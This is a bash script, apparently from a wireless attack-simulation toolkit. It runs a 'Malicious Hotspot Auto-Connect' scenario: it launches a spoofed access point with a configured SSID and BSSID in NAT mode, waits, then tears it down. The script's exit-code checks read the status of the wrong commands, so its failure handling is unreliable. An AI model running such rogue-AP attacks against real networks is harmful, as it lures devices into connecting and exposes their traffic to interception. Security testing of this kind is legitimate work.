#!/bin/bash

# ─── Paths ───
BASH_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
CONFIG_DIR="$BASH_DIR/config"
HELPERS_DIR="$BASH_DIR/helpers"
SERVICES_DIR="$BASH_DIR/services"
SCENARIO_DIR="$BASH_DIR/scenarios"
UTILITIES_DIR="$BASH_DIR/utilities"

# ─── Configs ───
source "$CONFIG_DIR/global.conf"
source "$CONFIG_DIR/t015.conf"

# ─── Helpers ───
source "$HELPERS_DIR/fn_print.sh"
source "$HELPERS_DIR/fn_mode.sh"

# ─── Run Attack ───
print_blank
print_info "Running T015 - Malicious Hotspot Auto-Connect attack for $T015_DURATION seconds"

# ─── Launch AP ───
print_info "Launching spoofed access point: SSID=$T015_SSID, BSSID=$T015_BSSID, Channel=$T015_CHANNEL"
bash "$UTILITIES_DIR/start-ap_t015.sh" ap_spoofed nat
print_info "AP running — waiting for $T015_DURATION seconds"
sleep "$T015_DURATION"

EXIT_CODE=$?
if [[ "$EXIT_CODE" -ne 0 ]]; then
    print_fail "Failed to launch spoofed AP"
    exit "$EXIT_CODE"
fi

# ─── Stop AP ───
print_info "Stopping access point"
bash "$UTILITIES_DIR/stop-ap.sh"
print_success "Spoofed AP stopped"

EXIT_CODE=$?

ensure_managed_mode

if [[ "$EXIT_CODE" -eq 124 ]]; then
    print_success "Attack ended"
elif [[ "$EXIT_CODE" -ne 0 ]]; then
    print_fail "hostapd exited with code $EXIT_CODE"
fi

exit 0